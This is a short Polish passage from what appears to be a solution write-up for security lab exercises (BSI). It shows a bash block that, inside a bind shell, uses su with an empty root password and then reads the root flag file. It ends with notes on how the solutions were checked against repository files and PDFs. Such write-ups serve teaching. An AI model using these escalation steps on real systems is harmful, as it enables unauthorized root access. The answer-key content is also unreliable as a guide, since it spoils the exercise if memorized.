> **Uwaga do rozwiązania:** Repozytorium wykorzystuje puste hasło roota, a PDF 7p na s. 20 - uprawnienie sudo do `service`. To różne konfiguracje końcowego zadania; zachowano rozwiązanie z repozytorium.

```bash
#Inside the bind shell (admin):
su #Root has an empty password (root::0:0 in /etc/passwd)
cat /root/root.txt #Submit the flag on the platform
```

## Źródła i zakres weryfikacji

Rozwiązania porównano z 14 plikami Markdown dostępnymi przez GitHub oraz ich lokalną kopią w `tmp/BSI-main/BSI-main`. Treść obu kopii była zgodna. PDF-y 1-7 i 1p-7p posłużyły do nazwania zadań i wskazania różnic; zachowano wartości z repozytorium, jeśli materiały się różnią.

Sprawdzono kompletność przeniesienia oraz renderowanie Markdown w projekcie. Nie potwierdzano flag ani skuteczności rozwiązań przez uruchamianie poleceń na maszynach BSI.
